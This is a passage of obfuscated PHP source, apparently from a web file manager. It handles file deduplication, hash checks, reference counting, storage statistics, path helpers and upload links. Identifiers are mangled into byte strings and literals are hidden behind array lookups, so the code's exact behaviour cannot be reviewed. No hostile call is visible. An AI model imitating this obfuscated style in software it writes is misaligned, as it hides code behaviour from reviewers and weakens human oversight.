intval($È¸¯à–¼[$©íá…°[79]]); if (!$È¸¯à–¼[$©íá…°[79]] && strlen($È¸¯à–¼[$©íá…°[677]]) > 32) { $È¸¯à–¼[$©íá…°[79]] = intval(substr($È¸¯à–¼[$©íá…°[677]], 32)); } $ğˆáÂÁ´ = $this->add($È¸¯à–¼); return $this->find($ğˆáÂÁ´); } public function addFile($¢¡Ì™°à, $Şáá¯“Ñ, $ÕÜèÃî” = false) { $Ğ…§˜ÍÛ =& $_SERVER[Š—Â“œÔ]; $Û©ò¹¥á = IO::hashSimple($¢¡Ì™°à); $µ¥ŒÄˆ = IO::size($¢¡Ì™°à); $¦¶©èÁ­ = $µ¥ŒÄˆ <= 1024 * 1024 * 10 ? IO::hashMd5($¢¡Ì™°à) : $Ğ…§˜ÍÛ[12]; $™Ùú¢ò§ = $Ğ…§˜ÍÛ[2035] . $Û©ò¹¥á; CacheLock::lock($™Ùú¢ò§); if ($¦¶©èÁ­ && $Û©ò¹¥á) { $¾âœÃ£® = $this->addFileCheckExist($Û©ò¹¥á, $¦¶©èÁ­, $µ¥ŒÄˆ); if ($¾âœÃ£®) { CacheLock::unlock($™Ùú¢ò§); return $¾âœÃ£®; } } $éÁÓºÉ = $this->addFileMake($¢¡Ì™°à, $µ¥ŒÄˆ, $Û©ò¹¥á, $¦¶©èÁ­, $Şáá¯“Ñ, $ÕÜèÃî”); $’†³”’ = $this->addFileData($éÁÓºÉ); CacheLock::unlock($™Ùú¢ò§); if (!$¦¶©èÁ­ && $’†³”’) { $this->fileMd5Check($’†³”’); } return $’†³”’; } public function fileMd5Check($ó¦Ø½ò) { $×„ÈÀÀ =& $_SERVER[Š—Â“œÔ]; $¯¹øĞ­ = array($ó¦Ø½ò[$×„ÈÀÀ[543]], $ó¦Ø½ò[$×„ÈÀÀ[87]]); $ë€½áÓÍ = $×„ÈÀÀ[2036] . $ó¦Ø½ò[$×„ÈÀÀ[87]]; $ª„Ùøˆ— = $×„ÈÀÀ[2037] . $ó¦Ø½ò[$×„ÈÀÀ[543]]; TaskQueue::add($×„ÈÀÀ[2038], $¯¹øĞ­, $ë€½áÓÍ, $ª„Ùøˆ—); } public function fileMd5Set($•Ûë¦½, $®«†ùÆÁ) { $ÑÁïûå =& $_SERVER[Š—Â“œÔ]; $Šò¥ş = $this->find($•Ûë¦½); if (!$Šò¥ş || $Šò¥ş[$ÑÁïûå[549]]) { return; } $û“çØÃ‘ = IO::hashMd5($®«†ùÆÁ); if (!$û“çØÃ‘) { return $ÑÁïûå[12]; } $this->where(array($ÑÁïûå[543] => $•Ûë¦½))->save(array($ÑÁïûå[549] => $û“çØÃ‘)); } public function addFileMake($ûõ¬‰¢ã, $¢æíÜ€¿, $š«´õÔ, $ÎĞ»Ëö‚, $¹Û÷ò¼¥, $¡ÊÆÔğÜ) { $Î £óÒ¼ =& $_SERVER[Š—Â“œÔ]; $İ„÷ø–‡ = $this->createFileName($¹Û÷ò¼¥, $š«´õÔ, $ÎĞ»Ëö‚); $Ã Öğı‡ = get_path_father($İ„÷ø–‡); $Ä©ÏÏõ = get_path_this($İ„÷ø–‡); if ($¡ÊÆÔğÜ) { $­»ÈµŞ€ = IO::move($ûõ¬‰¢ã, $Ã Öğı‡, !1, $Ä©ÏÏõ); } else { $­»ÈµŞ€ = IO::copy($ûõ¬‰¢ã, $Ã Öğı‡, !1, $Ä©ÏÏõ); } if (!$­»ÈµŞ€) { return !1; } $½ş…”õ¨ = KodIO::defaultDriver(); $„×ú„Î² = array($Î £óÒ¼[622] => $¢æíÜ€¿, $Î £óÒ¼[2032] => 1, $Î £óÒ¼[496] => $¹Û÷ò¼¥, $Î £óÒ¼[876] => $½ş…”õ¨[$Î £óÒ¼[477]], $Î £óÒ¼[497] => $İ„÷ø–‡, $Î £óÒ¼[2033] => $š«´õÔ, $Î £óÒ¼[2034] => $ÎĞ»Ëö‚); return $„×ú„Î²; } public function addFileCheckExist($ŠÈñ¨Ë¨, $èßå¹ªß, $»„“«¹—) { $ş£Ê„’Ş =& $_SERVER[Š—Â“œÔ]; $õ’¤íòÆ = $this->findByHash($ŠÈñ¨Ë¨, $èßå¹ªß); if (!$õ’¤íòÆ) { return !1; } $À÷ë‰™½ = array($ş£Ê„’Ş[2032] => intval($õ’¤íòÆ[$ş£Ê„’Ş[2039]]) + 1, $ş£Ê„’Ş[622] => $»„“«¹—); $this->where(array($ş£Ê„’Ş[544] => $õ’¤íòÆ[$ş£Ê„’Ş[543]]))->save($À÷ë‰™½); return $õ’¤íòÆ; } public function remove($ ğŸÚÃ») { $this->linkCountChange($ ğŸÚÃ», !1); $this->clearEmpty(); return !0; } public function linkAdd($›Ş¡ë·å) { $this->linkCountChange($›Ş¡ë·å, !0); } public function linkCountChange($ÕÏ©×ä‘, $ìŞñö) { $ÅÀÈ³œ‘ =& $_SERVER[Š—Â“œÔ]; if (!$ÕÏ©×ä‘) { return; } if (!is_array($ÕÏ©×ä‘)) { $ÕÏ©×ä‘ = array($ÕÏ©×ä‘); } $¹ÊúÀœ = array(); foreach ($ÕÏ©×ä‘ as $§ĞÈ É) { $÷ç„‰äŸ = $§ĞÈ É . $ÅÀÈ³œ‘[12]; if (!$¹ÊúÀœ[$÷ç„‰äŸ]) { $¹ÊúÀœ[$÷ç„‰äŸ] = 0; } $¹ÊúÀœ[$÷ç„‰äŸ]++; } $·¯¦¡é = array(); foreach ($¹ÊúÀœ as $§ĞÈ É => $ŸÏªşß…) { $÷ç„‰äŸ = $ŸÏªşß… . $ÅÀÈ³œ‘[12]; if (!$·¯¦¡é[$÷ç„‰äŸ]) { $·¯¦¡é[$÷ç„‰äŸ] = array(); } $·¯¦¡é[$÷ç„‰äŸ][] = $§ĞÈ É; } foreach ($·¯¦¡é as $ŸÏªşß… => $„çìÁ§¾) { if (!$„çìÁ§¾) { continue; } $ŸÏªşß… = $ìŞñö ? $ŸÏªşß… : -intval($ŸÏªşß…); $ßÑÀÃÆ€ = array($ÅÀÈ³œ‘[543] => array($ÅÀÈ³œ‘[7], $„çìÁ§¾)); if ($ŸÏªşß… < 0) { $ßÑÀÃÆ€[$ÅÀÈ³œ‘[2039]] = array($ÅÀÈ³œ‘[1089], abs($ŸÏªşß…)); } $this->where($ßÑÀÃÆ€)->setAdd($ÅÀÈ³œ‘[2039], $ŸÏªşß…); } } public function findByHash($‡ç«•Æ, $øá¸ëå = false) { $äØìÅã§ =& $_SERVER[Š—Â“œÔ]; if (!$‡ç«•Æ && !$øá¸ëå) { return !1; } $Öºù•Ññ = array($äØìÅã§[2033] => $‡ç«•Æ); if ($øá¸ëå) { $Öºù•Ññ = array($äØìÅã§[2034] => $øá¸ëå); } return $this->order($äØìÅã§[2040])->where($Öºù•Ññ)->find(); } public function clearEmpty($°í‹ñ’ = 1) { $ê»¤ååõ =& $_SERVER[Š—Â“œÔ]; $å±„ÙÈ = time() - 3600 * 24 * $°í‹ñ’; $ò¹ü”Šµ = $ê»¤ååõ[2041] . $å±„ÙÈ; $©Ûùî™û = $this->where($ò¹ü”Šµ)->select(); if (!$©Ûùî™û) { return; } $´æÀ…µ = new Task($ê»¤ååõ[2042], $ê»¤ååõ[12], count($©Ûùî™û)); foreach ($©Ûùî™û as $­üêÃˆô) { $´æÀ…µ->update(1); $this->resetFile($­üêÃˆô); } $´æÀ…µ->end(); } public function resetFile($áóèÃµ) { $¶§Æêêò =& $_SERVER[Š—Â“œÔ]; $àšÒçôÏ = array($¶§Æêêò[544] => $áóèÃµ[$¶§Æêêò[543]]); $áñ¬¸çÉ = Model($¶§Æêêò[1419])->where($àšÒçôÏ)->count(); $‡«Ê÷ÃÎ = Model($¶§Æêêò[2043])->where($àšÒçôÏ)->count(); $Š²’–È„ = intval($áñ¬¸çÉ) + intval($‡«Ê÷ÃÎ); if ($Š²’–È„ == 0) { IO::remove($áóèÃµ[$¶§Æêêò[87]]); Model($¶§Æêêò[2044])->delete($áóèÃµ[$¶§Æêêò[543]]); $this->where($àšÒçôÏ)->delete(); $this->metaSet($áóèÃµ[$¶§Æêêò[543]], null, null); write_log(ACTION . $¶§Æêêò[2045] . KodUser::id() . $¶§Æêêò[2046] . $áóèÃµ[$¶§Æêêò[543]] . $¶§Æêêò[2047] . $áóèÃµ[$¶§Æêêò[79]] . $¶§Æêêò[201] . $áóèÃµ[$¶§Æêêò[87]], $¶§Æêêò[2048]); return; } if ($áóèÃµ[$¶§Æêêò[2039]] != $Š²’–È„) { $this->where($àšÒçôÏ)->save(array($¶§Æêêò[2032] => $Š²’–È„)); } } public function storageInfo($íÃøğ’ = false) { $†ß‡ÌĞ =& $_SERVER[Š—Â“œÔ]; $»Ø¾ë¤ı = $this->count() + 0.0; $ÁêŒôñ = 0; $Ãà‹„Ù = 1; $³Æ‰”Ù¯ = 0; $±µß‹­œ = 5000; for ($×¬ÍÖú™ = 0; $×¬ÍÖú™ < $»Ø¾ë¤ı; $×¬ÍÖú™ = $×¬ÍÖú™ + $±µß‹­œ) { $À…ü§”´ = $this->limit($×¬ÍÖú™, $×¬ÍÖú™ + $±µß‹­œ)->select(); foreach ($À…ü§”´ as $¸‚¤ÊŒ·) { $Ãà‹„Ù += $¸‚¤ÊŒ·[$†ß‡ÌĞ[79]] * $¸‚¤ÊŒ·[$†ß‡ÌĞ[2039]]; $ÁêŒôñ += $¸‚¤ÊŒ·[$†ß‡ÌĞ[79]] * ($¸‚¤ÊŒ·[$†ß‡ÌĞ[2039]] - 1); $³Æ‰”Ù¯ += $¸‚¤ÊŒ·[$†ß‡ÌĞ[2039]]; } } $¤òƒÔîÊ = array($†ß‡ÌĞ[2049] => $Ãà‹„Ù, $†ß‡ÌĞ[2050] => $ÁêŒôñ, $†ß‡ÌĞ[2051] => $ÁêŒôñ / $Ãà‹„Ù, $†ß‡ÌĞ[83] => $»Ø¾ë¤ı, $†ß‡ÌĞ[2052] => $³Æ‰”Ù¯); return $¤òƒÔîÊ; } } goto D¡åçÔù”­; A¹–Ú¦…¶£: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $ìªÈ±æ« =& $_SERVER[Š—Â“œÔ]; $this->objectDriver = array($ìªÈ±æ«[60], $ìªÈ±æ«[61], $ìªÈ±æ«[62], $ìªÈ±æ«[63], $ìªÈ±æ«[64], $ìªÈ±æ«[65], $ìªÈ±æ«[66], $ìªÈ±æ«[67], $ìªÈ±æ«[68], $ìªÈ±æ«[69], $ìªÈ±æ«[70], $ìªÈ±æ«[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($áÙúİõ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($áÙúİõ, $_SERVER[Š—Â“œÔ][8]); } return $áÙúİõ; } public function iconvApp($€Ş‘áèÍ) { return $€Ş‘áèÍ; } public function iconvSystem($²Â«ÉÎ—) { return $²Â«ÉÎ—; } public function iconvTo($³·•­¬Ù, $Ä¿Šì˜£, $Ö×íóßı) { $³ºê®Ì› =& $_SERVER[Š—Â“œÔ]; if (!$³·•­¬Ù || !function_exists($³ºê®Ì›[72])) { return $³·•­¬Ù; } static $ì¼ÆÒŠ¶ = array(); $Å¦ªáğñ = $Ä¿Šì˜£ . $³ºê®Ì›[73] . $Ö×íóßı . $³ºê®Ì›[74] . $³·•­¬Ù; if (isset($ì¼ÆÒŠ¶[$Å¦ªáğñ])) { return $ì¼ÆÒŠ¶[$Å¦ªáğñ]; } if (function_exists($³ºê®Ì›[75])) { $ì¹…¾ëÊ = @mb_convert_encoding($³·•­¬Ù, $Ö×íóßı, $Ä¿Šì˜£); } else { $ì¹…¾ëÊ = @iconv($Ä¿Šì˜£, $Ö×íóßı, $³·•­¬Ù); } $ì¹…¾ëÊ = $ì¹…¾ëÊ ? $ì¹…¾ëÊ : $³·•­¬Ù; if (strstr($ì¹…¾ëÊ, $³ºê®Ì›[76])) { $ì¹…¾ëÊ = str_replace($³ºê®Ì›[76], $³ºê®Ì›[11], $ì¹…¾ëÊ); } $ì¼ÆÒŠ¶[$Ä¿Šì˜£ . $³ºê®Ì›[73] . $Ö×íóßı . $³ºê®Ì›[74] . $³·•­¬Ù] = $ì¹…¾ëÊ; $ì¼ÆÒŠ¶[$Ö×íóßı . $³ºê®Ì›[73] . $Ä¿Šì˜£ . $³ºê®Ì›[74] . $³·•­¬Ù] = $³·•­¬Ù; $ì¼ÆÒŠ¶[$Ö×íóßı . $³ºê®Ì›[73] . $Ä¿Šì˜£ . $³ºê®Ì›[74] . $ì¹…¾ëÊ] = $³·•­¬Ù; $ì¼ÆÒŠ¶[$Ä¿Šì˜£ . $³ºê®Ì›[73] . $Ö×íóßı . $³ºê®Ì›[74] . $ì¹…¾ëÊ] = $ì¹…¾ëÊ; return $ì¹…¾ëÊ; } public function getPathInner($´ÇÕñÁÆ) { $àéµà¤ = IO::init($´ÇÕñÁÆ); return $àéµà¤->path; } public function getPathOuter($¥ş¹ğÔÇ) { $”­íŸŒÇ =& $_SERVER[Š—Â“œÔ]; $Öã­òğŸ = strlen(trim($this->pathBase, $”­íŸŒÇ[8])); $¥ş¹ğÔÇ = substr(trim($¥ş¹ğÔÇ, $”­íŸŒÇ[8]), $Öã­òğŸ); return $this->pathDriver . $”­íŸŒÇ[8] . ltrim($¥ş¹ğÔÇ, $”­íŸŒÇ[8]); } public function isParentOf($õ¿È¶œş, $ñ§ªÂÈ‰) { $°ñŞŸàë =& $_SERVER[Š—Â“œÔ]; $õ¿È¶œş = rtrim(strtolower($õ¿È¶œş), $°ñŞŸàë[8]) . $°ñŞŸàë[8]; $ñ§ªÂÈ‰ = rtrim(strtolower($ñ§ªÂÈ‰), $°ñŞŸàë[8]) . $°ñŞŸàë[8]; $ı™ÓÛèÕ = strpos($ñ§ªÂÈ‰, $õ¿È¶œş) === 0; return $ı™ÓÛèÕ; } public function getType() { $æİÜÊ›û =& $_SERVER[Š—Â“œÔ]; $²Ş¢£€î = str_replace($æİÜÊ›û[77], $æİÜÊ›û[12], get_class($this)); return strtolower($²Ş¢£€î); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($©•ÆµŠ„, $³Ù–Æ¾½) { $ÚèÉ«õŒ =& $_SERVER[Š—Â“œÔ]; $ªÛ”ÚòŸ = rtrim($©•ÆµŠ„, $ÚèÉ«õŒ[8]) . $ÚèÉ«õŒ[8] . $³Ù–Æ¾½; $ˆ³‡ö¾ = $this->exist($ªÛ”ÚòŸ); return $ˆ³‡ö¾ ? $ªÛ”ÚòŸ : !1; } public function setModifyTime($¾åŞÔ»û, $õŞƒá¾ß = '') { } public function renameObject($‹Ôù‰ñ¶, $…¨ô¹¸ñ) { $¾¸œÄ¾ = $…¨ô¹¸ñ; $‹Ôù‰ñ¶ = $this->getPathOuter($‹Ôù‰ñ¶); $…¨ô¹¸ñ = $this->pathFather($‹Ôù‰ñ¶) . $…¨ô¹¸ñ; $•ò—¶ = IO::copy($‹Ôù‰ñ¶, $this->pathFather($‹Ôù‰ñ¶), REPEAT_RENAME_FOLDER, $¾¸œÄ¾); if ($•ò—¶) { IO::remove($‹Ôù‰ñ¶); } return $•ò—¶ ? $…¨ô¹¸ñ : !1; } public function tempFile($Íæê§ÚÓ = '', $¡ßş™® = '') { if (!$Íæê§ÚÓ) { $Íæê§ÚÓ = rand_string(15); } $³îöÚò“ = TEMP_FILES . rand_string(15) . $_SERVER[Š—Â“œÔ][8]; @mkdir($³îöÚò“, DEFAULT_PERRMISSIONS, !0); $Ã œø–Á = $³îöÚò“ . $Íæê§ÚÓ; @touch($Ã œø–Á); if ($¡ßş™®) { file_put_contents($Ã œø–Á, $¡ßş™®); } return $Ã œø–Á; } public function tempFileRemve($çÔ‘¹ö‹) { @unlink($çÔ‘¹ö‹); @rmdir($this->pathFather($çÔ‘¹ö‹)); } public function mkfile($„¦³Âƒ, $£åø×Ø = '', $ÚÀÁê = REPEAT_RENAME) { } public function mkdir($Ğ· ¨İ®, $÷¦®ì  = REPEAT_SKIP) { } public function delFile($•Ñó¨¹’) { } public function delFolder($£Ì‘Òêµ) { } public function copyFile($¯‡¦Îí, $“—ªŒÛ) { } public function moveFile($Ş•êÄàÖ, $³à½) { } public function remove($ÅôÑœÜÁ) { if ($this->isFile($ÅôÑœÜÁ)) { return $this->delFile($ÅôÑœÜÁ); } return $this->delFolder($ÅôÑœÜÁ); } public function rename($°‹ßß‰Ê, $£—íÉ“) { } public function exist($ì¨‘¼”) { } public function findByHash($ñ˜ÖÎÇ = '', $ş•Ëñ¦Ä = '') { return !1; } public function isFile($¹±ä¦ëå) { } public function isFolder($­ñ²ü¡) { } public function size($¶†ÒËÛµ) { } public function info($Æà¹ôùñ) { } public function infoSimple($‘¹ëÖ¦) { return $this->info($‘¹ëÖ¦); } public function infoAuth($ª°½ùõ) { return $this->info($ª°½ùõ); } public function infoFull($ÄÁí°È²) { return $this->info($ÄÁí°È²); } public function infoFullSimple($ñ«”ªş) { return $this->info($ñ«”ªş); } public function infoWithChildren($²şêÁÜ) { $„Î‰Ó©Â =& $_SERVER[Š—Â“œÔ]; static $ıÊ—øÜÉ = array(); if (isset($ıÊ—øÜÉ[$²şêÁÜ])) { return $ıÊ—øÜÉ[$²şêÁÜ]; } $«ÜÈÌ¨ = $this->info($²şêÁÜ); if ($«ÜÈÌ¨ && $«ÜÈÌ¨[$„Î‰Ó©Â[33]] == $„Î‰Ó©Â[78]) { $ÖÜú—ü£ = array($„Î‰Ó©Â[79] => 0, $„Î‰Ó©Â[80] => 0, $„Î‰Ó©Â[81] => 0); $this->infoChildren($²şêÁÜ, $ÖÜú—ü£); $«ÜÈÌ¨[$„Î‰Ó©Â[79]] = $ÖÜú—ü£[$„Î‰Ó©Â[79]]; $«ÜÈÌ¨[$„Î‰Ó©Â[82]] = array($„Î‰Ó©Â[83] => $ÖÜú—ü£[$„Î‰Ó©Â[80]], $„Î‰Ó©Â[84] => $ÖÜú—ü£[$„Î‰Ó©Â[81]]); $ıÊ—øÜÉ[$²şêÁÜ] = $«ÜÈÌ¨; } return $«ÜÈÌ¨; } public function listPath($¸ãØˆö¾, $©ŞïßÃ‹ = false) { } public function has($ø‘Ø¶“, $Ñ±ÓûŒ¥ = false, $¦åÂºÌ = false) { } public function canRead($Ì­òÏØ§) { } public function canWrite($±Ù×ô§·) { } public function getContent($–¤’´ğ­) { } public function setContent($Û¨â¯, $ä˜šÅ‡“ = '') { } protected function infoChildren($×ğ„…Õ¦, &$¹å³†çß) { $ê˜ûŞ£ =& $_SERVER[Š—Â“œÔ]; check_abort_echo(); $Šš…¯³Œ = $this->listPath($×ğ„…Õ¦, !0); $Šš…¯³Œ = array_merge($Šš…¯³Œ[$ê˜ûŞ£[85]], $Šš…¯³Œ[$ê˜ûŞ£[86]]); foreach ($Šš…¯³Œ as $Ç·´¨Ï) { if ($Ç·´¨Ï[$ê˜ûŞ£[33]] == $ê˜ûŞ£[78]) { $¹å³†çß[$ê˜ûŞ£[81]]++; $Îó‰“ª = $this->getPathInner($Ç·´¨Ï[$ê˜ûŞ£[87]]); $this->infoChildren($Îó‰“ª, $¹å³†çß); } else { $¹å³†çß[$ê˜ûŞ£[80]]++; $¹å³†çß[$ê˜ûŞ£[79]] += $Ç·´¨Ï[$ê˜ûŞ£[79]]; } } } public function fileSubstr($ø¿Ã”Šê, $‰¨È÷ÔÈ, $Çë´Ï ) { } public function listAll($ü« Á‘) { } public function listAllMake($¥õ¤®¨™, &$èùÉ–„Ì) { $ÉĞŠ¤²ş =& $_SERVER[Š—Â“œÔ]; check_abort_echo(); $Ø“ã¼ë = $this->listPath($¥õ¤®¨™, !0); if (!$Ø“ã¼ë) { return; } $¦›èÊ› = array_merge($Ø“ã¼ë[$ÉĞŠ¤²ş[85]], $Ø“ã¼ë[$ÉĞŠ¤²ş[86]]); foreach ($¦›èÊ› as $É«İÍÈ) { $İÈç˜‚ú = $É«İÍÈ[$ÉĞŠ¤²ş[33]] == $ÉĞŠ¤²ş[78]; $ĞÑÛ¨²² = array($ÉĞŠ¤²ş[87] => $É«İÍÈ[$ÉĞŠ¤²ş[87]], $ÉĞŠ¤²ş[78] => $İÈç˜‚ú); if (isset($É«İÍÈ[$ÉĞŠ¤²ş[79]])) { $ĞÑÛ¨²²[$ÉĞŠ¤²ş[79]] = $É«İÍÈ[$ÉĞŠ¤²ş[79]]; } if (isset($É«İÍÈ[$ÉĞŠ¤²ş[88]])) { $ĞÑÛ¨²²[$ÉĞŠ¤²ş[88]] = $É«İÍÈ[$ÉĞŠ¤²ş[88]]; } if (!$İÈç˜‚ú) { $èùÉ–„Ì[] = $ĞÑÛ¨²²; continue; } $èùÉ–„Ì[] = $ĞÑÛ¨²²; $°¡ªò´Í = $É«İÍÈ[$ÉĞŠ¤²ş[87]]; $Æì†ì”İ = $this->pathDriver; if (substr($É«İÍÈ[$ÉĞŠ¤²ş[87]], 0, strlen($Æì†ì”İ)) == $Æì†ì”İ) { $°¡ªò´Í = substr($°¡ªò´Í, strlen($Æì†ì”İ)); } $this->listAllMake($°¡ªò´Í, $èùÉ–„Ì); } } public function listAllSimple($÷­—™„Ë, $ïÁô«Î = false) { $³óèÔ»Â = $this->listAll($÷­—™„Ë); return $this->listAllSimpleMake($³óèÔ»Â, $this->getPathOuter($÷­—™„Ë), $ïÁô«Î); } public function listAllSimpleMake($©©€÷Ü­, $™çıê, $´İåéİ¡) { $¿ ¬ĞàÑ =& $_SERVER[Š—Â“œÔ]; $œŠÌ˜·à = array(); $™çıê = rtrim(get_path_father($™çıê), $¿ ¬ĞàÑ[8]) . $¿ ¬ĞàÑ[8]; foreach ($©©€÷Ü­ as $™ƒ˜‡ç°) { $â‡ƒçì† = array($¿ ¬ĞàÑ[87] => $™ƒ˜‡ç°[$¿ ¬ĞàÑ[87]], $¿ ¬ĞàÑ[89] => $™ƒ˜‡ç°[$¿ ¬ĞàÑ[87]], $¿ ¬ĞàÑ[78] => $™ƒ˜‡ç°[$¿ ¬ĞàÑ[78]]); if (isset($™ƒ˜‡ç°[$¿ ¬ĞàÑ[79]]) && !$™ƒ˜‡ç°[$¿ ¬ĞàÑ[78]]) { $â‡ƒçì†[$¿ ¬ĞàÑ[79]] = $™ƒ˜‡ç°[$¿ ¬ĞàÑ[79]]; } if (isset($™ƒ˜‡ç°[$¿ ¬ĞàÑ[88]])) { $â‡ƒçì†[$¿ ¬ĞàÑ[88]] = $™ƒ˜‡ç°[$¿ ¬ĞàÑ[88]]; } if (is_array($™ƒ˜‡ç°[$¿ ¬ĞàÑ[90]])) { $â‡ƒçì†[$¿ ¬ĞàÑ[89]] = $™ƒ˜‡ç°[$¿ ¬ĞàÑ[90]][$¿ ¬ĞàÑ[87]]; $â‡ƒçì†[$¿ ¬ĞàÑ[79]] = $™ƒ˜‡ç°[$¿ ¬ĞàÑ[90]][$¿ ¬ĞàÑ[79]]; $â‡ƒçì†[$¿ ¬ĞàÑ[88]] = $™ƒ˜‡ç°[$¿ ¬ĞàÑ[90]][$¿ ¬ĞàÑ[88]]; } else { if (substr($™ƒ˜‡ç°[$¿ ¬ĞàÑ[87]], 0, strlen($™çıê)) == $™çıê) { $â‡ƒçì†[$¿ ¬ĞàÑ[87]] = substr($™ƒ˜‡ç°[$¿ ¬ĞàÑ[87]], strlen($™çıê)); } } $õ×ïÉÛª = $™ƒ˜‡ç°[$¿ ¬ĞàÑ[78]] ? $¿ ¬ĞàÑ[8] : $¿ ¬ĞàÑ[12]; $â‡ƒçì†[$¿ ¬ĞàÑ[89]] = rtrim($â‡ƒçì†[$¿ ¬ĞàÑ[89]], $¿ ¬ĞàÑ[8]) . $õ×ïÉÛª; $â‡ƒçì†[$¿ ¬ĞàÑ[87]] = $¿ ¬ĞàÑ[8] . trim($â‡ƒçì†[$¿ ¬ĞàÑ[87]], $¿ ¬ĞàÑ[8]) . $õ×ïÉÛª; if (!$´İåéİ¡) { $Ò·œöõ½ = explode($¿ ¬ĞàÑ[8], trim($â‡ƒçì†[$¿ ¬ĞàÑ[87]], $¿ ¬ĞàÑ[8])); $â‡ƒçì†[$¿ ¬ĞàÑ[87]] = $¿ ¬ĞàÑ[8] . implode($¿ ¬ĞàÑ[8], array_slice($Ò·œöõ½, 1)) . $õ×ïÉÛª; } $œŠÌ˜·à[] = $â‡ƒçì†; } return array_sort_by($œŠÌ˜·à, $¿ ¬ĞàÑ[87]); } public function upload($•ä›ßŠ¨, $¸Óé´‡º, $¤Õà° = false, $òÈ€Ë²¯ = REPEAT_REPLACE) { } public function uploadFileByID($Ï¢—÷ûÉ, $¼«³ ™Ê, $ÅÁ„ÄÉï) { } public function uploadFileByPath($‰Ã¸¤‘Ù, $Õ½§¢Å¸, $‹®ã•Ù  = array()) { } public function isUploadServer() { $”‡Ø¢ÃÖ =& $_SERVER[Š—Â“œÔ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $”‡Ø¢ÃÖ[91]) { return !0; } return $GLOBALS[$”‡Ø¢ÃÖ[6]][$”‡Ø¢ÃÖ[92]][$”‡Ø¢ÃÖ[93]]; } public function isFileOutServer() { $Ş³ıÁ =& $_SERVER[Š—Â“œÔ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Ş³ıÁ[91]) { return !0; } return $GLOBALS[$Ş³ıÁ[6]][$Ş³ıÁ[92]][$Ş³ıÁ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ú•¼·‡ö) { $Éâ¶Ôéå =& $_SERVER[Š—Â“œÔ]; if (!$this->isCdnHost()) { return $ú•¼·‡ö; } return str_replace(trim(get_url_root($ú•¼·‡ö), $Éâ¶Ôéå[8]), trim($this->cdnHost, $Éâ¶Ôéå[8]), $ú•¼·‡ö); } public function uploadLink($†èƒ¢Œß, $¥Ì£û = 0) { $ŒÚİÕÆ =& $_SERVER[Š—Â“œÔ]; if ($this->isUploadServer()) { return; } $›ĞÔô‡µ = $this->getType(); if (!in_array($›ĞÔô‡µ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $²îö®‰ = 1024 * 1024 * 10; $‰¸Ùæ›‡ = $¥Ì£û <= $²îö®‰ ? $ŒÚİÕÆ[95] : $ŒÚİÕÆ[96]; $Ú†û®øÑ = (!$¥Ì£û ? 1 : ceil($¥Ì£û / pow(1024, 3))) * 3600 * 4; $©ı‹Äå› = $this->{$‰¸Ùæ›‡}($†èƒ¢Œß, $Ú†û®øÑ); if ($©ı‹Äå›) { $©ı‹Äå›[$ŒÚİÕÆ[97]] = $†èƒ¢Œß; $©ı‹Äå›[$ŒÚİÕÆ[98]] = $›ĞÔô‡µ; } return $©ı‹Äå›; } public function uploadFormData($²¾ı¼¶¿, $ƒÉ¯–æ = 3600) { } public function uploadMultiData($‰ïí“Ó, $Ÿ²Óó¼ = 3600) { } public function multiUploadFormData($€ŒÚùÃ, $ùÃ‚ÇïÃ = 3600) { return $this->uploadMultiData($€ŒÚùÃ, $ùÃ‚ÇïÃ); } public function download($²¬ëÉÙÃ, $ˆõÉ¥ò«) { } public function ext($‘µ£Ë»ª) { $®ÛŞ”§¥ =& $_SERVER[Š—Â“œÔ]; if (strpos($‘µ£Ë»ª, $®ÛŞ”§¥[8]) === -1) { $Ûş”Œú¯ = $‘µ£Ë»ª; } else { $Ûş”Œú¯ = $this->pathThis($‘µ£Ë»ª); } $¡Ëéê = $®ÛŞ”§¥[12]; if (strstr($Ûş”Œú¯, $®ÛŞ”§¥[10])) { $¡Ëéê = substr($Ûş”Œú¯, strrpos($Ûş”Œú¯, $®ÛŞ”§¥[10]) + 1); $¡Ëéê = strtolower($¡Ëéê); } if (strlen($¡Ëéê) > 3 && preg_match($®ÛŞ”§¥[99], $¡Ëéê, $å¿€íÖ)) { $¡Ëéê = $®ÛŞ”§¥[12]; } return $¡Ëéê; } public function pathThis($–†¹£èı) { $à¡´£ =& $_SERVER[Š—Â“œÔ]; $–†¹£èı = str_replace($à¡´£[100], $à¡´£[8], rtrim($–†¹£èı, $à¡´£[8])); $¸èéË©ö = strrpos($–†¹£èı, $à¡´£[8]); if ($¸èéË©ö === !1) { return $–†¹£èı; } return substr($–†¹£èı, $¸èéË©ö + 1); } public function pathFather($½‚š¿ùò) { $‘Ú¼“ù¡ =& $_SERVER[Š—Â“œÔ]; $½‚š¿ùò = str_replace($‘Ú¼“ù¡[100], $‘Ú¼“ù¡[8], rtrim($½‚š¿ùò, $‘Ú¼“ù¡[8])); $ƒÍáƒ™Ë = strrpos($½‚š¿ùò, $‘Ú¼“ù¡[8]); if ($ƒÍáƒ™Ë === !1) { return $‘Ú¼“ù¡[12]; } return substr($½‚š¿ùò, 0, $ƒÍáƒ™Ë + 1); } public function hashSimple($øü«àş§) { $íàŞü¦ =& $_SERVER[Š—Â“œÔ]; if (!$øü«àş§) { return md5($íàŞü¦[12]); } $–Ù†õ€ = $this->size($øü«àş§); $Í´ÒöäÍ = 200; $Ÿ¿úŠ»Ì = 50; if ($–Ù†õ€ <= $Í´ÒöäÍ * $Ÿ¿úŠ»Ì) { return $this->hashMd5($øü«àş§) . $–Ù†õ€; } $ä¦²À‡â = intval($–Ù†õ€ / $Ÿ¿úŠ»Ì); $ì¼«šß™ = $íàŞü¦[12]; for ($¿ğÍã¿ = 0; $¿ğÍã¿ < $Ÿ¿úŠ»Ì; $¿ğÍã¿++) { $ì¼«šß™ .= $this->fileSubstr($øü«àş§, $ä¦²À‡â * $¿ğÍã¿, $Í´ÒöäÍ); } $ì¼«šß™ .= $this->fileSubstr($øü«àş§, $–Ù†õ€ - $Í´ÒöäÍ, $Í´ÒöäÍ); return md5($ì¼«šß™) . 